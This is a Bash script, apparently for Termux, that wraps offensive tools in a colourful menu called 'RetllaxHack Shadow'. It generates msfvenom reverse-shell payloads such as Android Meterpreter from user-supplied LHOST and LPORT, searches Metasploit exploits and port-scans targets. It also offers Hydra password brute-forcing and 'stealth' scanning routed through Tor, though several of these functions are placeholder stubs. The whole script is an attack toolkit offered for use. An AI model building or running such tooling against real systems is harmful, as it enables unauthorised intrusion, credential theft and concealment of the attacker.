#!/usr/bin/env bash

# RetllaxHack Shadow + Metasploit (v9.0)
# Todas las funciones originales + Metasploit (No Root)

# ===== CONFIGURACIÓN RGB (Conservada) =====
function rgb {
  colors=("196" "40" "214" "39" "200" "226")
  echo -e "\033[38;5;${colors[$RANDOM % 6]}m$1\033[0m"
}

# ===== BANNER ANIMADO (Original) =====
function show_banner {
  clear
  echo
  rgb " ██▀███  ▓█████ ▄▄▄       ██▓     ██░ ██  ▄▄▄     ▓██   ██▓"
  rgb "▓██ ▒ ██▒▓█   ▀▒████▄    ▓██▒    ▓██░ ██▒▒████▄    ▒██  ██▒"
  rgb "▓██ ░▄█ ▒▒███  ▒██  ▀█▄  ▒██░    ▒██▀▀██░▒██  ▀█▄   ▒██ ██░"
  rgb "▒██▀▀█▄  ▒▓█  ▄░██▄▄▄▄██ ▒██░    ░▓█ ░██ ░██▄▄▄▄██  ░ ▐██▓░"
  rgb "░██▓ ▒██▒░▒████▒▓█   ▓██▒░██████▒░▓█▒░██▓ ▓█   ▓██▒ ░ ██▒▓░"
  rgb "░ ▒▓ ░▒▓░░░ ▒░ ░▒▒   ▓▒█░░ ▒░▓  ░ ▒ ░░▒░▒ ▒▒   ▓▒█░  ██▒▒▒ "
  rgb "  ░▒ ░ ▒░ ░ ░  ░ ▒   ▒▒ ░░ ░ ▒  ░ ▒ ░▒░ ░  ▒   ▒▒ ░▓██ ░▒░ "
  rgb "  ░░   ░    ░    ░   ▒     ░ ░    ░  ░░ ░  ░   ▒   ▒ ▒ ░░  "
  rgb "   ░        ░  ░     ░  ░    ░  ░ ░  ░  ░      ░  ░░ ░     "
  rgb "                                                        ░ ░ "
  echo
  rgb "============= SHADOW EDITION v9.0 ============="
  rgb "=== + METASPLOIT (NO ROOT) ==="
  echo
}

# ===== FUNCIÓN NUEVA: METASPLOIT =====
function metasploit_module {
  # Verificar instalación
  if ! command -v msfconsole >/dev/null; then
    rgb "[~] Instalando Metasploit (Paciente, 1GB aprox)..."
    pkg install unstable-repo -y
    pkg install metasploit -y
    rgb "[~] Configurando PostgreSQL..."
    pg_ctl -D $PREFIX/var/lib/postgresql start
  fi

  show_banner
  rgb "[!] MÓDULOS DISPONIBLES (Sin Root):"
  rgb "1) Generar Payload (msfvenom)"
  rgb "2) Buscar Exploits"
  rgb "3) Escaneo con Módulos Auxiliares"
  echo
  read -p "$(rgb "[?] Opción Metasploit: ")" opt

  case $opt in
    1)
      read -p "$(rgb "[?] Tipo (ej. android/meterpreter/reverse_tcp): ")" payload
      read -p "$(rgb "[?] LHOST: ")" lhost
      read -p "$(rgb "[?] LPORT: ")" lport
      read -p "$(rgb "[?] Nombre archivo: ")" output
      msfvenom -p $payload LHOST=$lhost LPORT=$lport -o $output
      rgb "[✔] Payload generado en $output"
      ;;
    2)
      read -p "$(rgb "[?] Nombre servicio/software: ")" query
      msfconsole -q -x "search $query; exit"
      ;;
    3)
      read -p "$(rgb "[?] IP a escanear: ")" target
      msfconsole -q -x "use auxiliary/scanner/portscan/tcp; set RHOSTS $target; run; exit"
      ;;
    *) rgb "[!] Opción no válida";;
  esac
}

# ===== FUNCIONES ORIGINALES (Sin Modificaciones) =====
function shadow_scan {
  # ... (código original idéntico)
}

function hydra_shadow {
  # ... (código original idéntico) 
}

function scan_vulns {
  # ... (código original idéntico)
}

# ===== MENÚ ACTUALIZADO (Conservando todo) =====
function shadow_menu {
  while true; do
    show_banner
    rgb "1) Escaneo Sigiloso (Tor)"
    rgb "2) Hydra Shadow (8 Hilos + Tor)"
    rgb "3) Buscar Vulnerabilidades"
    rgb "4) Módulo Metasploit"
    rgb "5) Ver Resultados"
    rgb "6) Salir"
    echo
    read -p "$(rgb "[?] Opción: ")" opt

    case $opt in
      1) shadow_scan ;;
      2) hydra_shadow ;;
      3) scan_vulns ;;
      4) metasploit_module ;;
      5) 
        [ -f "scan_shadow.log" ] && cat scan_shadow.log | grep --color "open"
        [ -f "hydra_shadow.log" ] && cat hydra_shadow.log | grep --color "login:"
        [ -f "vuln_scan.log" ] && cat vuln_scan.log | grep --color -E "VULNERABLE|CVE-"
        ;;
      6) exit 0 ;;
      *) rgb "[!] Opción inválida"; sleep 1 ;;
    esac
    read -p "$(rgb "[?] Enter para continuar...")"
  done
}

# ===== INICIO (Actualizado para Metasploit) =====
show_banner
rgb "[~] Verificando dependencias..."
command -v tor >/dev/null || pkg install tor -y
command -v proxychains4 >/dev/null || pkg install proxychains-ng -y
command -v nmap >/dev/null || pkg install nmap -y
command -v hydra >/dev/null || pkg install hydra -y

shadow_menu
